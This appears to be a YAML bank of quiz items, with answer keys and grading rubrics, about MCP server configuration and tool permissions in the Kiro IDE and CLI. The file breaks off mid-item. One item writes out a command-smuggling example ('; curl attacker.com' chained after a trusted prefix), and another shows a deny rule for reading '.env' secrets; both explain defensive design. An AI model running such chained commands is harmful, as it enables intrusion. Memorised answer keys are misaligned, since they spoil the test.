@@ -1,0 +1,2476 @@
+# Topic: kiro-ide-mcp-and-tools (kiro-ide)
+# MCP server configuration and tool integration in the Kiro IDE — .kiro/settings/mcp.json, local vs remote, auto-approval.
+# 100 items, 20/tier (100-500). Authored + adversarially reviewed for correctness, recency, calibration, dedup.
+
+id: kiro-ide-mcp-and-tools
+class:
+  kind: tool
+  tool: kiro-ide
+title: Kiro IDE MCP & Tools
+summary: >-
+  MCP server configuration and tool integration in the Kiro IDE — .kiro/settings/mcp.json, local vs
+  remote, auto-approval.
+triggerSignals: []
+items:
+  - id: kmt-100-mc-a
+    tier: 100
+    bloom: remember
+    difficulty: 125
+    type: multiple_choice
+    prompt: |
+      What protocol does Kiro IDE use to connect to external tool and context servers?
+    choices:
+      - id: a
+        text: MCP (Model Context Protocol)
+      - id: b
+        text: LSP (Language Server Protocol)
+      - id: c
+        text: DAP (Debug Adapter Protocol)
+      - id: d
+        text: gRPC Tool Bridge
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Kiro supports MCP (Model Context Protocol) to connect external tools and
+      context servers. LSP and DAP are unrelated editor protocols.
+  - id: kmt-100-mc-b
+    tier: 100
+    bloom: remember
+    difficulty: 135
+    type: multiple_choice
+    prompt: |
+      Where does Kiro IDE store the WORKSPACE-level MCP configuration?
+    choices:
+      - id: a
+        text: .kiro/settings/mcp.json
+      - id: b
+        text: .vscode/mcp.json
+      - id: c
+        text: .kiro/mcp.json
+      - id: d
+        text: mcp.json at the repo root
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Workspace MCP config lives at `.kiro/settings/mcp.json`. The user-level
+      equivalent is `~/.kiro/settings/mcp.json`.
+  - id: kmt-100-mc-c
+    tier: 100
+    bloom: remember
+    difficulty: 140
+    type: multiple_choice
+    prompt: |
+      What is the root JSON key that holds server definitions in a Kiro `mcp.json` file?
+    choices:
+      - id: a
+        text: servers
+      - id: b
+        text: mcpServers
+      - id: c
+        text: providers
+      - id: d
+        text: tools
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      The root key is `mcpServers`; each entry maps a server name to its config object.
+  - id: kmt-100-mc-d
+    tier: 100
+    bloom: remember
+    difficulty: 130
+    type: multiple_choice
+    prompt: |
+      For a LOCAL (command-based) MCP server in Kiro, which field is REQUIRED besides `command`?
+    choices:
+      - id: a
+        text: url
+      - id: b
+        text: transport
+      - id: c
+        text: args
+      - id: d
+        text: env
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      Local servers require both `command` and `args`. `env`, `disabled`,
+      `autoApprove`, and `disabledTools` are optional. `url` is for remote servers.
+  - id: kmt-100-mc-e
+    tier: 100
+    bloom: remember
+    difficulty: 145
+    type: multiple_choice
+    prompt: |
+      Which `mcpServers` field accepts an array of tool names to run without per-use prompts?
+    choices:
+      - id: a
+        text: disabledTools
+      - id: b
+        text: trustedTools
+      - id: c
+        text: autoApprove
+      - id: d
+        text: allowList
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      `autoApprove` is an array of tool names that run without prompting; `"*"`
+      means all tools. `disabledTools` does the opposite (exclude tools).
+  - id: kmt-100-mc-f
+    tier: 100
+    bloom: remember
+    difficulty: 150
+    type: multiple_choice
+    prompt: |
+      What syntax does Kiro use to expand an environment variable inside an MCP `env` value?
+    choices:
+      - id: a
+        text: $VARIABLE_NAME
+      - id: b
+        text: '%VARIABLE_NAME%'
+      - id: c
+        text: '{{VARIABLE_NAME}}'
+      - id: d
+        text: ${VARIABLE_NAME}
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      Kiro expands env vars with `${VARIABLE_NAME}`, e.g. `"API_KEY": "${BRAVE_API_KEY}"`.
+  - id: kmt-100-mc-g
+    tier: 100
+    bloom: remember
+    difficulty: 135
+    type: multiple_choice
+    prompt: |
+      Which field temporarily turns an MCP server off WITHOUT deleting its config block?
+    choices:
+      - id: a
+        text: disabled
+      - id: b
+        text: enabled
+      - id: c
+        text: paused
+      - id: d
+        text: inactive
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Setting `"disabled": true` turns a server off while keeping its config. The
+      default is false.
+  - id: kmt-100-mc-h
+    tier: 100
+    bloom: remember
+    difficulty: 155
+    type: multiple_choice
+    prompt: |
+      For a REMOTE MCP server in Kiro, which field is required?
+    choices:
+      - id: a
+        text: command
+      - id: b
+        text: url
+      - id: c
+        text: args
+      - id: d
+        text: socket
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Remote servers require `url` (HTTPS, or HTTP for localhost). `command`/`args`
+      are for local stdio servers.
+  - id: kmt-100-mc-i
+    tier: 100
+    bloom: remember
+    difficulty: 160
+    type: multiple_choice
+    prompt: |
+      Which two authentication-related fields are documented for REMOTE MCP servers in Kiro?
+    choices:
+      - id: a
+        text: oauth and oauthScopes
+      - id: b
+        text: apiKey and secret
+      - id: c
+        text: token and refresh
+      - id: d
+        text: basicAuth and digest
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Remote servers support `headers`, `oauth`, and `oauthScopes` for authentication.
+  - id: kmt-100-mc-j
+    tier: 100
+    bloom: remember
+    difficulty: 145
+    type: multiple_choice
+    prompt: |
+      In Kiro IDE chat, which execution mode is the DEFAULT?
+    choices:
+      - id: a
+        text: Supervised
+      - id: b
+        text: Read-only
+      - id: c
+        text: Autopilot
+      - id: d
+        text: Manual
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      Autopilot is the default mode; Kiro works autonomously to complete tasks
+      end-to-end. Supervised mode is opt-in.
+  - id: kmt-100-mc-k
+    tier: 100
+    bloom: remember
+    difficulty: 150
+    type: multiple_choice
+    prompt: |
+      In Kiro CLI v2, which slash command manages tool permissions?
+    choices:
+      - id: a
+        text: /trust
+      - id: b
+        text: /permissions
+      - id: c
+        text: /tools
+      - id: d
+        text: /grant
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      `/tools` manages tool permissions, with subcommands trust, untrust,
+      trust-all, reset, and help.
+  - id: kmt-100-mc-l
+    tier: 100
+    bloom: remember
+    difficulty: 140
+    type: multiple_choice
+    prompt: |
+      In Kiro CLI v2, `read` and `write` are trusted by default for the current working
+      directory. Which built-in tool instead requires per-request approval by default?
+    choices:
+      - id: a
+        text: shell
+      - id: b
+        text: read
+      - id: c
+        text: write
+      - id: d
+        text: (none; all five are trusted by default)
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      The v2 built-in tools are read, write, shell, aws, and report. Both `read` and
+      `write` are trusted by default for the current working directory; `shell` (like
+      `aws` and `report`) is per-request by default and must be trusted explicitly.
+  - id: kmt-100-mc-m
+    tier: 100
+    bloom: remember
+    difficulty: 165
+    type: multiple_choice
+    prompt: |
+      In the Kiro CLI v3 declarative permission model, which `effect` is the MOST restrictive?
+    choices:
+      - id: a
+        text: allow
+      - id: b
+        text: ask
+      - id: c
+        text: deny
+      - id: d
+        text: warn
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      Effects resolve by restrictiveness: deny > ask > allow. There is no `warn` effect.
+  - id: kmt-100-ff-a
+    tier: 100
+    bloom: remember
+    difficulty: 150
+    type: free_form
+    prompt: |
+      Name the two Kiro IDE MCP configuration file paths (workspace-level and user-level)
+      and state which one takes precedence when both define the same server.
+    guidance: |
+      Recall of the two canonical MCP config paths and the merge/precedence rule.
+    rubric:
+      criteria:
+        - id: c1
+          text: Gives the workspace path as .kiro/settings/mcp.json
+        - id: c2
+          text: Gives the user path as ~/.kiro/settings/mcp.json
+        - id: c3
+          text: States configs merge with workspace taking precedence
+      referenceAnswer: |
+        Workspace: `.kiro/settings/mcp.json`. User/global: `~/.kiro/settings/mcp.json`.
+        When both exist the configurations are merged, with workspace settings taking
+        precedence on conflict.
+      passThreshold: 0.6
+  - id: kmt-100-ff-b
+    tier: 100
+    bloom: remember
+    difficulty: 140
+    type: free_form
+    prompt: |
+      List the five required-or-optional fields of a LOCAL Kiro MCP server entry, marking
+      which two are required.
+    guidance: |
+      Recall of local server field set and which are required.
+    rubric:
+      criteria:
+        - id: c1
+          text: Names command and args as the two required fields
+        - id: c2
+          text: Names at least two of env, disabled, autoApprove, disabledTools as optional
+      referenceAnswer: |
+        Required: `command` and `args`. Optional: `env`, `disabled`, `autoApprove`,
+        `disabledTools`.
+      passThreshold: 0.6
+  - id: kmt-100-ff-c
+    tier: 100
+    bloom: remember
+    difficulty: 155
+    type: free_form
+    prompt: |
+      What is the difference between the `autoApprove` and `disabledTools` arrays in a
+      Kiro MCP server config?
+    guidance: |
+      Recall of the contrasting purpose of the two tool-name arrays.
+    rubric:
+      criteria:
+        - id: c1
+          text: autoApprove lists tools that run without per-use approval prompts
+        - id: c2
+          text: disabledTools lists tools excluded/hidden from the agent entirely
+      referenceAnswer: |
+        `autoApprove` is an array of tool names allowed to run without prompting (`"*"`
+        = all). `disabledTools` lists tools to exclude so the agent cannot call them
+        at all. One relaxes prompting; the other removes the tool.
+      passThreshold: 0.6
+  - id: kmt-100-ff-d
+    tier: 100
+    bloom: remember
+    difficulty: 145
+    type: free_form
+    prompt: |
+      What are the five Kiro CLI v2 built-in tools, and which of them are trusted by default
+      for the current working directory?
+    guidance: |
+      Recall of the v2 built-in tool names and which are default-trusted in the CWD.
+    rubric:
+      criteria:
+        - id: c1
+          text: Lists read, write, shell, aws, report
+        - id: c2
+          text: States both read and write are trusted by default for the current working directory
+      referenceAnswer: |
+        The v2 built-in tools are `read`, `write`, `shell`, `aws`, and `report`.
+        Both `read` and `write` are trusted by default for the current working directory;
+        reads or writes outside it (and `shell`/`aws`/`report`) require per-request approval.
+      passThreshold: 0.6
+  - id: kmt-100-ff-e
+    tier: 100
+    bloom: remember
+    difficulty: 135
+    type: free_form
+    prompt: |
+      In one sentence, what does Autopilot mode let Kiro do, and how does it differ from
+      Supervised mode at a high level?
+    guidance: |
+      Recall the one-line definition of each mode.
+    rubric:
+      criteria:
+        - id: c1
+          text: Autopilot works autonomously end-to-end without per-step approval
+        - id: c2
+          text: Supervised yields for approval after each turn that contains file edits
+      referenceAnswer: |
+        Autopilot works autonomously to complete tasks end-to-end (creating files,
+        editing code, running commands) without per-step approval; Supervised yields
+        for your approval after each turn that contains file edits.
+      passThreshold: 0.6
+  - id: kmt-100-ff-f
+    tier: 100
+    bloom: remember
+    difficulty: 160
+    type: free_form
+    prompt: |
+      Name the four subcommands of the Kiro CLI v2 `/tools` command (besides `help`).
+    guidance: |
+      Recall of the /tools subcommand set.
+    rubric:
+      criteria:
+        - id: c1
+          text: Lists trust and untrust
+        - id: c2
+          text: Lists trust-all and reset
+      referenceAnswer: |
+        `/tools` subcommands are `trust`, `untrust`, `trust-all`, `reset`, and `help`.
+      passThreshold: 0.6
+  - id: kmt-100-ff-g
+    tier: 100
+    bloom: remember
+    difficulty: 165
+    type: free_form
+    prompt: |
+      What are the three permission `effect` values in Kiro CLI v3, and in what order do they
+      resolve from most to least restrictive?
+    guidance: |
+      Recall of the three effects and their precedence ordering.
+    rubric:
+      criteria:
+        - id: c1
+          text: Names deny, ask, allow as the three effects
+        - id: c2
+          text: States the order deny > ask > allow (most to least restrictive)
+      referenceAnswer: |
+        The three effects are `deny`, `ask`, and `allow`. They resolve by restrictiveness:
+        deny > ask > allow, so a more permissive rule never overrides a stricter one.
+      passThreshold: 0.6
+  - id: kmt-200-mc-a
+    tier: 200
+    bloom: understand
+    difficulty: 225
+    type: multiple_choice
+    prompt: |
+      Why does Kiro support BOTH workspace-level and user-level MCP config files instead of one?
+    choices:
+      - id: a
+        text: >-
+          To let project-shareable servers live in the repo while personal/secret servers stay
+          user-global
+      - id: b
+        text: >-
+          Because the workspace file only supports local servers and the user file only remote
+          servers
+      - id: c
+        text: Because the two files use incompatible JSON schemas
+      - id: d
+        text: To force every server to be defined twice for redundancy
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Two scopes let a team commit project-relevant servers in `.kiro/settings/mcp.json`
+      while each developer keeps personal/secret servers in `~/.kiro/settings/mcp.json`.
+      Both scopes use the same schema and both support local and remote servers.
+  - id: kmt-200-mc-b
+    tier: 200
+    bloom: understand
+    difficulty: 235
+    type: multiple_choice
+    prompt: |
+      What is the practical benefit of using `${BRAVE_API_KEY}` in an MCP `env` block instead
+      of pasting the literal key?
+    choices:
+      - id: a
+        text: It makes the server start faster
+      - id: b
+        text: It keeps the secret out of the committed config and sources it from the environment
+      - id: c
+        text: It is required syntax; literal values are rejected
+      - id: d
+        text: It encrypts the key inside the JSON file
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Env-var expansion keeps secrets out of version-controlled config; the value is
+      resolved from the environment at runtime. Literal values are allowed but leak secrets.
+  - id: kmt-200-mc-c
+    tier: 200
+    bloom: understand
+    difficulty: 245
+    type: multiple_choice
+    prompt: |
+      Why is the claim "Kiro only supports stdio/local MCP servers" false?
+    choices:
+      - id: a
+        text: Kiro only supports remote servers, not local ones
+      - id: b
+        text: Kiro forwards all MCP traffic through the IDE's language server
+      - id: c
+        text: Kiro documents remote servers via a `url` field with HTTPS and OAuth support
+      - id: d
+        text: Local servers were removed in v3
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      Kiro documents remote servers configured with `url` (HTTPS), plus `headers`,
+      `oauth`, and `oauthScopes`. Both local and remote transports are supported.
+  - id: kmt-200-mc-d
+    tier: 200
+    bloom: understand
+    difficulty: 230
+    type: multiple_choice
+    prompt: |
+      How does `autoApprove` change the agent's behavior compared with leaving it unset?
+    choices:
+      - id: a
+        text: It hides the named tools from the agent
+      - id: b
+        text: It lets the named tools run without the per-use approval prompt
+      - id: c
+        text: It restarts the server before each tool call
+      - id: d
+        text: It forces the tools to run in a sandbox
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Without `autoApprove`, each MCP tool invocation prompts for approval. Listing a
+      tool in `autoApprove` lets it run unprompted.
+  - id: kmt-200-mc-e
+    tier: 200
+    bloom: understand
+    difficulty: 250
+    type: multiple_choice
+    prompt: |
+      In Supervised mode, why are file changes presented as individual "hunks"?
+    choices:
+      - id: a
+        text: Because Kiro cannot write whole files in Supervised mode
+      - id: b
+        text: To compress the diff for faster rendering
+      - id: c
+        text: So each change can be accepted, rejected, or discussed at fine granularity
+      - id: d
+        text: Because hunks bypass the permission system
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      Supervised mode yields after each turn containing edits and shows changes as
+      hunks so you can accept/reject per-hunk, per-file, or all at once.
+  - id: kmt-200-mc-f
+    tier: 200
+    bloom: understand
+    difficulty: 255
+    type: multiple_choice
+    prompt: |
+      Why does the Kiro CLI v3 permission model resolve conflicts as deny > ask > allow?
+    choices:
+      - id: a
+        text: So an `allow` rule can silently widen access granted elsewhere
+      - id: b
+        text: So a stricter rule always wins, and a permissive rule cannot weaken a restriction
+      - id: c
+        text: Because rules are evaluated bottom-to-top and the last one wins
+      - id: d
+        text: Because deny and allow are aliases for the same effect
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Restrictiveness ordering guarantees a more permissive rule can never override a
+      stricter one, so adding an `allow` cannot accidentally undo a `deny` or `ask`.
+  - id: kmt-200-mc-g
+    tier: 200
+    bloom: understand
+    difficulty: 240
+    type: multiple_choice
+    prompt: |
+      Why does choosing "Trust" (not just "Yes") at a Kiro CLI approval prompt matter for a batch?
+    choices:
+      - id: a
+        text: Trust permanently disables all future prompts for every tool
+      - id: b
+        text: Trust only applies to the single current call, same as Yes
+      - id: c
+        text: Trust rolls back the previous tool call
+      - id: d
+        text: Trust auto-approves the other pending invocations of that same tool in the batch
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      The prompt offers Yes / Trust / No. "Yes" approves the single call; "Trust"
+      auto-approves the remaining pending invocations of that same tool in the batch.
+  - id: kmt-200-mc-h
+    tier: 200
+    bloom: understand
+    difficulty: 260
+    type: multiple_choice
+    prompt: |
+      What is the design intent of storing v3 workspace permissions under
+      `~/.kiro/workspace-roots/<hash>/permissions.yaml` instead of inside the repo?
+    choices:
+      - id: a
+        text: To make permissions easier to share across a team via git
+      - id: b
+        text: So a cloned repository cannot ship trust rules that silently grant the agent access
+      - id: c
+        text: To reduce the size of the repository
+      - id: d
+        text: Because YAML cannot be committed to git
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Workspace permissions are stored per-user OUTSIDE the repo, so a cloned/malicious
+      repo cannot inject trust rules to grant the agent extra access.
+  - id: kmt-200-mc-i
+    tier: 200
+    bloom: understand
+    difficulty: 235
+    type: multiple_choice
+    prompt: |
+      Why is `disabled: true` preferable to deleting an MCP server block while troubleshooting?
+    choices:
+      - id: a
+        text: It deletes the server's cached tools to free memory
+      - id: b
+        text: It is the only way to stop a server from auto-restarting
+      - id: c
+        text: It turns the server off but preserves its full config for easy re-enabling
+      - id: d
+        text: It converts the server from remote to local
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      `disabled: true` toggles a server off without losing its configuration, so you
+      can re-enable it by flipping the flag rather than re-authoring the block.
+  - id: kmt-200-mc-j
+    tier: 200
+    bloom: understand
+    difficulty: 250
+    type: multiple_choice
+    prompt: |
+      How is Kiro CLI related to Amazon Q Developer CLI?
+    choices:
+      - id: a
+        text: Kiro CLI is the rebrand/successor of the Amazon Q Developer CLI
+      - id: b
+        text: Kiro CLI is a fork maintained by Anthropic
+      - id: c
+        text: They are unrelated tools that happen to share a config format
+      - id: d
+        text: Amazon Q Developer CLI is a plugin you install into Kiro CLI
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      AWS docs state Kiro is a rebrand of the Amazon Q Developer console with the same
+      functionality, and the amazon-q-developer-cli repo notes it is now available as Kiro CLI.
+  - id: kmt-200-mc-k
+    tier: 200
+    bloom: understand
+    difficulty: 245
+    type: multiple_choice
+    prompt: |
+      Why does Kiro split compound shell commands (e.g. on `&&`, `;`, `|`) before matching
+      permission rules?
+    choices:
+      - id: a
+        text: To run the sub-commands in parallel for speed
+      - id: b
+        text: Because YAML cannot represent compound commands
+      - id: c
+        text: To deduplicate identical commands in the batch
+      - id: d
+        text: So a trusted prefix like `npm test *` cannot smuggle an untrusted `; curl attacker.com`
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      Each sub-command is matched independently so a trusted pattern cannot be used to
+      smuggle an untrusted command chained after `;`, `&&`, `||`, or `|`.
+  - id: kmt-200-mc-l
+    tier: 200
+    bloom: understand
+    difficulty: 230
+    type: multiple_choice
+    prompt: |
+      What does it mean that v2 `read` is "trusted by default for the current working directory"?
+    choices:
+      - id: a
+        text: Reads anywhere on disk run without prompting
+      - id: b
+        text: Reads inside the CWD run unprompted, but reads outside it still require approval
+      - id: c
+        text: Shell commands run inside the CWD are auto-approved
+      - id: d
+        text: The agent caches the entire CWD into context at startup
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Default read trust is scoped to the working directory; paths inside the CWD do
+      not trigger the picker, but reading outside the CWD still prompts.
+  - id: kmt-200-mc-m
+    tier: 200
+    bloom: understand
+    difficulty: 255
+    type: multiple_choice
+    prompt: |
+      Why might a team prefer `autoApprove` on a read-only MCP server but NOT on a server
+      that can write files or call external APIs?
+    choices:
+      - id: a
+        text: Write tools cannot be auto-approved by the schema
+      - id: b
+        text: Read-only servers ignore autoApprove entirely
+      - id: c
+        text: External API calls are always free, so they need no review
+      - id: d
+        text: >-
+          Read-only tools have lower blast radius if invoked unexpectedly, so prompting adds little
+          safety
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      Auto-approving low-risk read-only tools removes friction with little downside,
+      whereas write/side-effecting tools warrant a prompt because an unexpected call
+      can cause real damage.
+  - id: kmt-200-ff-a
+    tier: 200
+    bloom: understand
+    difficulty: 240
+    type: free_form
+    prompt: |
+      Explain how Kiro merges workspace and user MCP configs, and what "workspace takes
+      precedence" means when both define a server with the same name.
+    guidance: |
+      Looks for the merge semantics plus the conflict-resolution rule.
+    rubric:
+      criteria:
+        - id: c1
+          text: States that when both files exist the configs are merged (union of servers)
+        - id: c2
+          text: States that on a same-name conflict the workspace definition wins
+      referenceAnswer: |
+        If both files exist, Kiro merges the two `mcpServers` maps so you get the union
+        of all servers. When the same server name appears in both, the workspace-level
+        definition takes precedence over the user-level one.
+      passThreshold: 0.6
+  - id: kmt-200-ff-b
+    tier: 200
+    bloom: understand
+    difficulty: 250
+    type: free_form
+    prompt: |
+      Explain why Autopilot is a reasonable DEFAULT for Kiro, and when a developer would
+      switch to Supervised mode instead.
+    guidance: |
+      Looks for understanding of the autonomy/control tradeoff, not just definitions.
+    rubric:
+      criteria:
+        - id: c1
+          text: Autopilot maximizes throughput by completing multi-step tasks without per-step approval
+        - id: c2
+          text: Supervised is chosen for higher-risk or unfamiliar changes where per-hunk review matters
+        - id: c3
+          text: Notes you can toggle modes at any time via the autopilot switch
+      referenceAnswer: |
+        Autopilot is a sensible default because most agent work is multi-step and
+        stopping for approval at every edit kills throughput; Kiro still lets you view
+        and revert changes. A developer switches to Supervised for risky, unfamiliar,
+        or production-adjacent changes where reviewing each hunk before it lands matters.
+        You can toggle between the two at any time using the autopilot switch.
+      passThreshold: 0.6
+  - id: kmt-200-ff-c
+    tier: 200
+    bloom: understand
+    difficulty: 255
+    type: free_form
+    prompt: |
+      Explain the security rationale behind storing Kiro CLI v3 workspace permissions
+      per-user outside the repository.
+    guidance: |
+      Looks for the supply-chain/trust-injection threat model.
+    rubric:
+      criteria:
+        - id: c1
+          text: Trust rules live per-user (e.g. under ~/.kiro/workspace-roots/<hash>/) not in the repo
+        - id: c2
+          text: >-
+            A cloned or malicious repo therefore cannot inject rules that auto-grant the agent
+            access
+      referenceAnswer: |
+        Because trust is stored per-user outside the repository, the permission rules a
+        developer carries are their own. A cloned, forked, or malicious repository cannot
+        ship a `permissions.yaml` that silently grants the agent broad access, closing a
+        supply-chain attack where a repo grants itself trust.
+      passThreshold: 0.6
+  - id: kmt-200-ff-d
+    tier: 200
+    bloom: understand
+    difficulty: 235
+    type: free_form
+    prompt: |
+      Contrast "Yes" and "Trust" at a Kiro CLI tool approval prompt. What does each do to the
+      rest of the current batch?
+    guidance: |
+      Looks for the per-call vs per-batch distinction.
+    rubric:
+      criteria:
+        - id: c1
+          text: Yes approves only the single current tool invocation
+        - id: c2
+          text: Trust auto-approves the other pending invocations of that same tool in the batch
+      referenceAnswer: |
+        "Yes" approves just the one tool call in front of you. "Trust" approves that call
+        AND auto-approves the remaining pending invocations of the same tool in the current
+        batch, so you are not prompted again for it during that run.
+      passThreshold: 0.6
+  - id: kmt-200-ff-e
+    tier: 200
+    bloom: understand
+    difficulty: 245
+    type: free_form
+    prompt: |
+      Why does Kiro use separate `autoApprove` (a list of tools) rather than a single
+      global "trust this server" switch? Give the practical advantage.
+    guidance: |
+      Looks for per-tool granularity reasoning.
+    rubric:
+      criteria:
+        - id: c1
+          text: Per-tool granularity lets safe tools run unprompted while risky tools still prompt
+        - id: c2
+          text: Notes one server can expose tools of differing risk
+      referenceAnswer: |
+        A single MCP server often exposes both low-risk read tools and higher-risk
+        write/side-effecting tools. A per-tool `autoApprove` list lets you unprompt only
+        the safe ones while still requiring confirmation for the dangerous ones, instead
+        of an all-or-nothing trust toggle.
+      passThreshold: 0.6
+  - id: kmt-200-ff-f
+    tier: 200
+    bloom: understand
+    difficulty: 260
+    type: free_form
+    prompt: |
+      The v2 tools are named `read`/`write`/`shell` while v3 capabilities are named
+      `fs_read`/`fs_write`/`shell`. Explain why treating these names as interchangeable is risky.
+    guidance: |
+      Looks for awareness of the two-system migration naming trap.
+    rubric:
+      criteria:
+        - id: c1
+          text: Notes Kiro is mid-migration with two coexisting permission systems
+        - id: c2
+          text: A rule or trust written against one naming scheme will not match the other
+      referenceAnswer: |
+        Kiro documents two permission systems at once: session-based v2 (`read`/`write`/
+        `shell` via `/tools`) and declarative v3 (`fs_read`/`fs_write`/`shell` in
+        `permissions.yaml`). The names are NOT aliases, so a trust or rule written for one
+        scheme will silently fail to match the other, leaving you under- or over-permissioned.
+      passThreshold: 0.6
+  - id: kmt-200-ff-g
+    tier: 200
+    bloom: understand
+    difficulty: 230
+    type: free_form
+    prompt: |
+      Explain why `${VARIABLE_NAME}` expansion in MCP `env` blocks is preferable to committing
+      a literal API key, from both a security and a portability standpoint.
+    guidance: |
+      Looks for both the secret-hygiene and the portability angle.
+    rubric:
+      criteria:
+        - id: c1
+          text: Security - keeps the secret out of version control / shareable config
+        - id: c2
+          text: Portability - each environment supplies its own value without editing the file
+      referenceAnswer: |
+        Security: the literal key never lands in a committed `mcp.json`, so it is not
+        exposed in git history or shared configs. Portability: the same config works
+        across machines and CI because each environment provides its own value for the
+        variable, with no per-machine edits to the JSON.
+      passThreshold: 0.6
+  - id: kmt-300-mc-a
+    tier: 300
+    bloom: apply
+    difficulty: 325
+    type: multiple_choice
+    prompt: |
+      You want to add a local filesystem MCP server named `fs` that runs `npx server-filesystem`
+      and never prompts you. Which `mcpServers` entry is correct?
+    choices:
+      - id: a
+        text: '{"fs": {"command": "npx", "args": ["server-filesystem"], "autoApprove": ["*"]}}'
+      - id: b
+        text: '{"fs": {"url": "npx server-filesystem", "trust": true}}'
+      - id: c
+        text: '{"fs": {"run": "npx server-filesystem", "autoApprove": "all"}}'
+      - id: d
+        text: '{"servers": {"fs": {"command": "npx server-filesystem"}}}'
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Local servers need `command` plus `args` (an array) under the `mcpServers` key.
+      `autoApprove: ["*"]` suppresses prompts for all of that server's tools.
+  - id: kmt-300-mc-b
+    tier: 300
+    bloom: apply
+    difficulty: 335
+    type: multiple_choice
+    prompt: |
+      A teammate's Brave Search MCP server needs its API key, but you must not commit the key.
+      Which `env` value is correct?
+    choices:
+      - id: a
+        text: '"BRAVE_API_KEY": "sk-live-abc123"'
+      - id: b
+        text: '"BRAVE_API_KEY": "${BRAVE_API_KEY}"'
+      - id: c
+        text: '"BRAVE_API_KEY": "$env:BRAVE_API_KEY"'
+      - id: d
+        text: '"BRAVE_API_KEY": "%BRAVE_API_KEY%"'
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Use `${BRAVE_API_KEY}` so Kiro expands the value from the environment at runtime,
+      keeping the literal key out of the committed config.
+  - id: kmt-300-mc-c
+    tier: 300
+    bloom: apply
+    difficulty: 345
+    type: multiple_choice
+    prompt: |
+      Your MCP server exposes tools `search` (read-only) and `write_file`. You want `search`
+      to run unprompted but always confirm `write_file`. What should you set?
+    choices:
+      - id: a
+        text: '"autoApprove": ["search"]'
+      - id: b
+        text: '"autoApprove": ["*"]'
+      - id: c
+        text: '"disabledTools": ["search"]'
+      - id: d
+        text: '"autoApprove": ["search", "write_file"]'
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Listing only `search` in `autoApprove` unprompts that tool while `write_file`
+      (not listed) still prompts on each use.
+  - id: kmt-300-mc-d
+    tier: 300
+    bloom: apply
+    difficulty: 330
+    type: multiple_choice
+    prompt: |
+      A server `legacy-db` is misbehaving and you want to stop Kiro from loading it, but keep
+      the block so you can re-enable it tomorrow. What do you do?
+    choices:
+      - id: a
+        text: Delete the legacy-db block from mcp.json
+      - id: b
+        text: 'Add "disabled": true to the legacy-db block'
+      - id: c
+        text: Rename the key to legacy-db.off
+      - id: d
+        text: 'Set "autoApprove": [] on the block'
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      `"disabled": true` turns the server off without removing its config. An empty
+      `autoApprove` only affects prompting, not whether the server loads.
+  - id: kmt-300-mc-e
+    tier: 300
+    bloom: apply
+    difficulty: 355
+    type: multiple_choice
+    prompt: |
+      In Kiro CLI v2 you want to stop confirming every `git status` AND `git diff` without
+      trusting all shell commands. Which trust choice fits best?
+    choices:
+      - id: a
+        text: Trust the Entire Tool (shell *)
+      - id: b
+        text: Trust the base command pattern git *
+      - id: c
+        text: Use /tools trust-all
+      - id: d
+        text: Trust only the full command git status, leaving git diff prompting
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Trusting the base `git *` pattern covers both `git status` and `git diff` while
+      still prompting for non-git shell commands. `shell *` and `trust-all` are too broad.
+  - id: kmt-300-mc-f
+    tier: 300
+    bloom: apply
+    difficulty: 360
+    type: multiple_choice
+    prompt: |
+      Write a Kiro CLI v3 rule that lets the agent read anywhere under `src/` but never read
+      files matching `**/*.env`. Which pair of rules is correct?
+    choices:
+      - id: a
+        text: allow fs_read match "src/**"; deny fs_read match "**/*.env"
+      - id: b
+        text: allow fs_read match "src/**" exclude "**/*.env" only
+      - id: c
+        text: deny fs_read match "src/**"; allow fs_read match "**/*.env"
+      - id: d
+        text: ask fs_read match "src/**"; ask fs_read match "**/*.env"
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      An `allow fs_read match "src/**"` plus a `deny fs_read match "**/*.env"` works
+      because deny > allow, so the `.env` deny wins over the broad src allow.
+  - id: kmt-300-mc-g
+    tier: 300
+    bloom: apply
+    difficulty: 340
+    type: multiple_choice
+    prompt: |
+      You are running Kiro CLI in a trusted CI pipeline that must execute without any prompts.
+      Which v3 rule is the documented pattern?
+    choices:
+      - id: a
+        text: 'capability: all, effect: allow'
+      - id: b
+        text: 'capability: shell, effect: ask'
+      - id: c
+        text: 'capability: builtin, effect: deny'
+      - id: d
+        text: 'capability: mcp, effect: allow'
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
